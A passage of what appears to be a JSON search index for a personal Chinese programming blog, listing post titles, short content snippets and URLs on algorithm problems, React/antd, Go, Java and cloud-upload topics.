10","lvl0":"阿里OSS上传文件【官网文档】","lvl1":null,"lvl2":"摘要","objectID":"8b762787f9c0ef8ae940deece727f2ee","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E9%98%BF%E9%87%8Coss%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"content":"api学习 本文档提供了Java SDK媒体上传相关功能的API调用示例，包含上传地址和凭证、注册媒资信息等。要实现完整的媒体文件上传，可配合客","lvl0":"阿里云 视频点播上传文件","lvl1":null,"lvl2":"摘要","objectID":"a753a4e8c6040ef974b96566b3149b90","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%98%E5%8C%96/%E8%A7%86%E9%A2%91%E7%82%B9%E6%92%AD%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"},{"content":"1389. 按既定顺序创建目标数组 Difficulty: 简单 给你两个整数数组 nums 和 index。你需要按照以下规则创建目标数组： 目标数组 target 最初为空。 按从左到右的顺序依次读取 nums[i]","lvl0":"按既定顺序创建目标数组","lvl1":null,"lvl2":"摘要","objectID":"1529f54b67395a8b5757500600714e61","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/lc.1389%E6%8C%89%E6%97%A2%E5%AE%9A%E9%A1%BA%E5%BA%8F%E5%88%9B%E5%BB%BA%E7%9B%AE%E6%A0%87%E6%95%B0%E7%BB%84/"},{"content":"按钮开关同步数据","lvl0":"按钮开关同步数据","lvl1":null,"lvl2":"摘要","objectID":"e228900a7603f45a496a9182f54828ab","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/%E6%8C%89%E9%92%AE%E5%BC%80%E5%85%B3%E5%90%8C%E6%AD%A5%E6%95%B0%E6%8D%AE/"},{"content":"react 绑定 ctrl+s 事件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 useEffect(()=\u0026gt;{ const key = (e) =\u0026gt; { if (e.keyCode == 83 \u0026amp;\u0026amp; (navigator.platform.match(\u0026#34;Mac\u0026#34;) ? e.metaKey : e.ctrlKey)){ e.preventDefault(); // alert(\u0026#39;saved\u0026#39;); // $(\u0026#39;#submit_\u0026#39;).trigger(\u0026#39;click\u0026#39;) saveMyCourse() } } document.body.addEventListener(\u0026#39;keydown\u0026#39;, key); return ()=\u0026gt; { document.removeEventListener(\u0026#39;keydown\u0026#39;,key) } } ,[])","lvl0":"绑定ctrl+s事件","lvl1":null,"lvl2":"摘要","objectID":"c33bab168e89f401c93c30ae106b3c2b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E7%BB%91%E5%AE%9A-ctrl+s%E4%BA%8B%E4%BB%B6/"},{"content":"弹框表单组件 参考视频 6分钟 表单组件设置属性 1 2 3 4 5 6 7 8 9 useEffect(()=\u0026gt; { // if (formShow) { // } console.log(img); form.setFieldsValue({ courseCoverImg:img, }) },[img]) 自定义表单高阶组件 参考视频-12分钟 17 分钟表单联动效果","lvl0":"表单组件使用,设置属性","lvl1":null,"lvl2":"摘要","objectID":"4b0a0b2a29d50e140d3711a80fc96f85","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/%E8%A1%A8%E5%8D%95%E7%BB%84%E4%BB%B6/"},{"content":"600. 不含连续1的非负整数 Difficulty: 困难 给定一个正整数 n，找出小于或等于 n 的非负整数中，其二进制表示不包含 **连续的1 **的个数。 示例 1: 1 2 3 4 5 6 7 8","lvl0":"不含连续1的非负整数","lvl1":null,"lvl2":"摘要","objectID":"fb77497499add0b258e9960ee00578eb","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/leetcode600_%E4%B8%8D%E5%90%AB%E8%BF%9E%E7%BB%AD1%E7%9A%84%E9%9D%9E%E8%B4%9F%E6%95%B4%E6%95%B0/"},{"content":"文章发布功能_ 7分钟开始学 react hooks 使用学习 button组件传值 - 18分钟","lvl0":"参考项目","lvl1":null,"lvl2":"摘要","objectID":"42bd54d449770c4f3ae3d0af15b78f37","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83%E5%8A%9F%E8%83%BD/"},{"content":"152. 乘积最大子数组 Difficulty: 中等 给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例","lvl0":"乘积最大的子数组","lvl1":null,"lvl2":"摘要","objectID":"8a0bc87ff8e03b06589c3281277a6759","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/"},{"content":"抽屉效果实现 参考视频","lvl0":"抽屉效果实现","lvl1":null,"lvl2":"摘要","objectID":"969db572221ead3b3a4911f420e4e4c2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E6%8A%BD%E5%B1%89%E6%95%88%E6%9E%9C%E5%AE%9E%E7%8E%B0%E5%8F%B3%E4%BE%A7%E6%8A%BD%E5%B1%89/"},{"content":"","lvl0":"代码分层思想【golang语言】","lvl1":null,"lvl2":"摘要","objectID":"5a18649ff2ef0273c3d6cddae2553bbb","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E4%BB%A3%E7%A0%81%E5%88%86%E5%B1%82/%E4%BB%A3%E7%A0%81%E5%88%86%E5%B1%82/"},{"content":"单例懒加载的实现方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package io.github.lyr2000.dissertation.util; import cn.hutool.crypto.SecureUtil; import cn.hutool.crypto.symmetric.AES; /** * @author","lvl0":"单例懒加载的实现方式","lvl1":null,"lvl2":"摘要","objectID":"b0906f494b13a2d0b41ef291eeb43980","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81/%E5%8D%95%E4%BE%8B%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"446. 等差数列划分 II - 子序列 Difficulty: 困难 给你一个整数数组 nums ，返回 nums 中所有 等差子序列 的数目。 如果一个序列中 至少有三个元素 ，并且任意两个相邻元素之差相同，","lvl0":"等差数列划分 II -子序列","lvl1":null,"lvl2":"摘要","objectID":"1a7fcb4fe675faa16974a17d1e1568e7","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/%E7%AD%89%E5%B7%AE%E6%95%B0%E5%88%97%E5%88%92%E5%88%86ii-%E5%AD%90%E5%BA%8F%E5%88%97/"},{"content":"面试题 08.06. 汉诺塔问题 Difficulty: **在经典汉诺塔问题中，有 3 根柱子及 N 个不同大小的穿孔圆盘，盘子可以滑入任意一根柱子。一开始，所有盘子自上而下按升序依次","lvl0":"递归算法_汉诺塔","lvl1":null,"lvl2":"摘要","objectID":"858f9f56a50589dc319f264723941baf","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95/%E6%B1%89%E8%AF%BA%E5%A1%94%E7%AE%97%E6%B3%95/"},{"content":"1456. 定长子串中元音的最大数目 Difficulty: 中等 给你字符串 s 和整数 k 。 请返回字符串 s 中长度为 k 的单个子字符串中可能包含的最大元音字母数。 英文中的 元音字母 为（","lvl0":"定长子串中元音的最大数目","lvl1":null,"lvl2":"摘要","objectID":"3c907723e1befb68db3ab5dadd1504d1","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%BC%98%E5%8C%96/lc.1456.%E5%AE%9A%E9%95%BF%E5%AD%90%E4%B8%B2%E4%B8%AD%E5%85%83%E9%9F%B3%E4%B8%AA%E6%9C%80%E5%A4%A7%E6%95%B0%E7%9B%AE/"},{"content":"二叉树的遍历 前序遍历 1 2 3 4 5 6 7 8 9 10 11 12 public List\u0026lt;Integer\u0026gt; ans = new ArrayList\u0026lt;\u0026gt;(); public List\u0026lt;Integer\u0026gt; preorderTraversal(TreeNode root){ preorder(root); return ans; } public void preorder(TreeNode node) { if(node == null) return; ans.add(node.val); preorder(node.left); preorder(node.right); } 中序遍历 1 2 3 4 5 6 7 8 9 10 11 12 public List\u0026lt;Integer\u0026gt; ans = new","lvl0":"二叉树遍历","lvl1":null,"lvl2":"摘要","objectID":"1379d1f0f1f9a7ef22f5ced6095c5d4d","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86/"},{"content":"go语言反射处理 TypeOf ValueOf 1 2 3 4 5 6 7 8 9 10 11 12 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; ) func main() { i := 1 t := (reflect.TypeOf(i)) fmt.Println(reflect.TypeOf(t)) } 调用结构体方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package","lvl0":"反射","lvl1":null,"lvl2":"摘要","objectID":"50403d82b0d65c8d5d95846de0eba9ea","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E5%8F%8D%E5%B0%84/"},{"content":"","lvl0":"格式化sql工具总结","lvl1":null,"lvl2":"摘要","objectID":"60347594bdf4efe5dcf134d0052acd1c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/idea%E5%B7%A5%E5%85%B7/%E6%A0%BC%E5%BC%8F%E5%8C%96sql%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/"},{"content":"Brog调度原理 安全性隔离： • 早期采用 Chroot jail，后期版本基于 Namespace。 性能隔离： • 采用基于 Cgroup 的容器技术实现。 • 在线任务（prod","lvl0":"隔离性实现原理","lvl1":["k8s"],"lvl2":"摘要","objectID":"6f8d72e7ba0b0bbb7d100c7631e8dc7b","tags":["k8s"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/k8s/%E9%9A%94%E7%A6%BB%E6%80%A7%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"},{"content":"实现的代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const InnerTable = ({ history }) =\u0026gt; { //更新权限 updatePermission({ permissionId:currentId, pathKey:permissionKey, permissionName }).then(( {code}) =\u0026gt; { if(code ==200) { message.info(\u0026#","lvl0":"更新数据手动刷新页面","lvl1":null,"lvl2":"摘要","objectID":"0df0e85e335ec71a5b1b2b8385eba7d6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE%E6%89%8B%E5%8A%A8%E5%88%B7%E6%96%B0%E9%A1%B5%E9%9D%A2%E6%96%B9%E6%A1%88/"},{"content":"管理系统layout 总结 参考文档链接 视频 14分钟学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44","lvl0":"管理系统 layout","lvl1":null,"lvl2":"摘要","objectID":"b5ab4bcb99c7c14dd307a575118a1433","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80/"},{"content":"搭建管理系统脚手架 参考学习项目 搭建路由 19分开始看 排版布局 参考视频","lvl0":"管理系统实战学习","lvl1":null,"lvl2":"摘要","objectID":"ac3ad4d9c2c28174165d5a3c596b914b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/"},{"content":"红黑树、哈希表、堆 红黑树 红黑树的每个节点上都有存储位表示节点的颜色，可以是红(Red)或黑(Black)。 红黑树的特性: （1）每个节点或者是","lvl0":"红黑树、哈希表、堆【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"746cb070b819bfcdc5b2b0950f2f4db7","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%A2%E9%BB%91%E6%A0%91%E5%93%88%E5%B8%8C%E8%A1%A8%E5%A0%86/"},{"content":"给定一个长度为 nn 的整数序列 a1,a2,…,an 请你判断序列 aa 是否包含长度至少为 33 的回文子序列？ 输入格式 第一行包含整数 T ，表示共有 T 组测试数据","lvl0":"回文子序列","lvl1":null,"lvl2":"摘要","objectID":"e041c270f084f4e9177e7da9f8709bc5","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%9B%9E%E6%96%87/%E5%9B%9E%E6%96%87%E5%AD%90%E5%BA%8F%E5%88%97/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import axios from \u0026#34;axios\u0026#34;; import {message} from \u0026#39;antd\u0026#39; axios.defaults.baseURL=\u0026#39;http://localhost:8081/\u0026#39; const getToken = ()=\u0026gt; { let token = sessionStorage.getItem(\u0026#39;token\u0026#39;) return token||\u0026#34;\u0026#34;; } axios.defaults.headers.common[\u0026#39;token\u0026#39;] =","lvl0":"基本模板","lvl1":null,"lvl2":"摘要","objectID":"b9d601510327f68a1b20e27cd0715324","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A8%A1%E6%9D%BF/"},{"content":"基础 语法学习 参考博客 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;section class=\u0026#34;app-main\u0026#34;\u0026gt; \u0026lt;transition name=\u0026#34;fade-transform\u0026#34; mode=\u0026#34;out-in\u0026#34;\u0026gt; \u0026lt;router-view :key=\u0026#34;key\u0026#34; /\u0026gt; \u0026lt;/transition\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { name: \u0026#39;AppMain\u0026#39;, computed: { key() { return this.$route.path; } } }; \u0026lt;/script\u0026gt;","lvl0":"基础语法学习【router-view】","lvl1":null,"lvl2":"摘要","objectID":"9b2a3dea3cf7398726e1acc33cebebdd","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/router-view/"},{"content":"hashMap优化方法总结 hashMap 默认 是16的数组长度，非常的耗费内存 如果知道了数据具体的数量，并且指定 hashMap 的 具体容量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15","lvl0":"基于HashMap的内存优化方法","lvl1":null,"lvl2":"摘要","objectID":"8aef06db73f6856dce58a59c547f0d6c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/java%E8%B0%83%E4%BC%98/hashmap%E4%BC%98%E5%8C%96/"},{"content":"快速排序算法的基本原理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;iostream\u0026gt;#include \u0026lt;vector\u0026gt;using namespace std; vector\u0026lt;int\u0026gt; arr = {3,4,8,1,2,3}; void quicksort(int l ,int r) { if(l\u0026gt;=r) return; int i = l-1,j = r+1; int pivot = arr[(i+j)/2]; while(i\u0026lt;j)","lvl0":"快速排序算法","lvl1":null,"lvl2":"摘要","objectID":"6e995f5187e29280712e527d37b0ab4b","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"content":"golang 理解网络协议","lvl0":"理解网络协议","lvl1":null,"lvl2":"摘要","objectID":"4202cd07bfb12c92cc1a38979e55d415","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%90%86%E8%A7%A3%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"content":"项目练手 源码地址 包安装 1 2 3 4 5 6 7 npx create-react-app test_system_backend cd test_system_backend yarn yarn add react-router-dom npm start 1 2 3 4 5 6 7 yarn add antd yarn add react-router yarn add react-router-dom yarn add react-redux yarn add redux yarn add axios react 动态路由学习 创建路由 router 这里可以","lvl0":"练手项目","lvl1":null,"lvl2":"摘要","objectID":"1659aa7bb5440c4fe31f9c7ecc0a0731","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/%E7%BB%83%E6%89%8B/"},{"content":"1960. 两个回文子字符串长度的最大乘积 Difficulty: 困难 给你一个下标从 0 开始的字符串 s ，你需要找到两个 **不重叠****的回文 **子字符串，它们的长度都必须为","lvl0":"两个回文子字符串长度的最大乘积","lvl1":null,"lvl2":"摘要","objectID":"4ff35ae067257ec148d702e93f2a6a18","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%9B%9E%E6%96%87/lc1960.%E4%B8%A4%E4%B8%AA%E5%9B%9E%E6%96%87%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E6%9C%80%E5%A4%A7%E4%B9%98%E7%A7%AF/"},{"content":"路由守卫授权 学习视频1——参考第8分钟， 13分钟 使用 react router-dom 来解决这个问题 1 cnpm i --save-dev react-router-dom 1 2 3 4 5 6 import IndexRouter from \u0026#39;./router/IndexRouter\u0026#39; function App() { return \u0026lt;div\u0026gt; \u0026lt;IndexRouter\u0026gt;\u0026lt;/IndexRouter\u0026gt; \u0026lt;/div\u0026gt; } 1 2 3 4 5 6 7 8 9 10 11 12","lvl0":"路由守卫授权","lvl1":null,"lvl2":"摘要","objectID":"8ec68229af08fd026c5a4ff84129fef4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB%E6%8E%88%E6%9D%83/"},{"content":"已知 11 年 11 月 11 日是星期一。 现在给定一个日期，请你判断是星期几。 注意闰年的 22 月有 2929 天。 满足下面条件之一的是闰年： 年份是 44 的整数倍，而且不是 100100 的","lvl0":"枚举_日期类题","lvl1":null,"lvl2":"摘要","objectID":"ee0624ee589be6e5724362135491080f","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%9E%9A%E4%B8%BE_%E6%97%A5%E6%9C%9F%E7%B1%BB%E9%A2%98/"},{"content":"模拟退火算法 入门 介绍模拟退火前，先介绍爬山算法。爬山算法是一种简单的贪心搜索算法，该算法每次从当前解的临近解空间中选择一个最优解作为当前解，","lvl0":"模拟退火算法","lvl1":null,"lvl2":"摘要","objectID":"47687393783610ab6e7ccd99784ce1f8","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E7%AE%97%E6%B3%95/"},{"content":"布隆过滤器 golang 爬虫项目使用 开源的布隆过滤器 参考项目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46","lvl0":"爬虫使用布隆过滤器","lvl1":null,"lvl2":"摘要","objectID":"3f23a1e98dc74f9887758bb319051e5c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8/"},{"content":"前端table表格展示 参考视频 自定义表格 项 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49","lvl0":"前端 table表格展示","lvl1":null,"lvl2":"摘要","objectID":"42495292b015e57d668ed5aedb868931","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/table%E8%A1%A8%E6%A0%BC%E5%B1%95%E7%A4%BA/"},{"content":"可以通过判断配置 属性 来 做 判断 spring.profiles.active ， 如果用户传的 token 是事先规定好的一个字符串，我们就可以这样做 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26","lvl0":"前后端分离如何mock 数据","lvl1":null,"lvl2":"摘要","objectID":"079f49879c50d88477bf403ee6e8a8be","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springboot/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%A6%82%E4%BD%95-mock-token%E6%95%B0%E6%8D%AE/"},{"content":"每一头牛的愿望就是变成一头最受欢迎的牛。 现在有 N 头牛，编号从 1 到 N ，给你 M 对整数 (A,B) ，表示牛 A 认为牛 B 受欢迎。 这种关系是具有传递性的，如果 A 认","lvl0":"强连通分量_受欢迎的牛","lvl1":null,"lvl2":"摘要","objectID":"eac9869b362ead07d65ff9a6b67fa724","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%9B%BE%E8%AE%BA%E9%97%AE%E9%A2%98/tarjan%E7%AE%97%E6%B3%95%E4%BE%8B%E9%A2%98/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F_%E5%8F%97%E6%AC%A2%E8%BF%8E%E7%9A%84%E7%89%9B/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 